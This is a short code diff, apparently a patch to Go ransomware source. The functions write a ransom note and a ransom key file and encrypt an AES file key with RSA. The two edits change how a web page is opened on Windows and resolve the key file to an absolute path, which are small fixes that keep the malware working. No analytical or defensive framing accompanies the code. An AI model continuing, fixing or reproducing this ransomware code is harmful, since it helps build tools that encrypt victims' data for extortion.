@@ -136,7 +136,7 @@ func DisplayWebPage(url string) error {
     switch runtime.GOOS {
     case "windows":
         cmd = "cmd"
-        args = []string{"/c", "start"}
+        args = []string{"/c"}
     case "darwin":
         cmd = "open"
     default:
@@ -509,7 +509,7 @@ func writeRansomNote(rootDir string, text string) {
 }
 
 func writeRansomKeyFile(rootDir string, aesKey [32]byte) {
-	var ransomKeyFile = path.Join(rootDir, RANSOM_KEY_FILE)
+	ransomKeyFile, _ := filepath.Abs(path.Join(rootDir, RANSOM_KEY_FILE))
 
 	// encrypt the AES key with 2048 RSA
 	privKey, err := rsa.GenerateKey(crand.Reader, 2048)
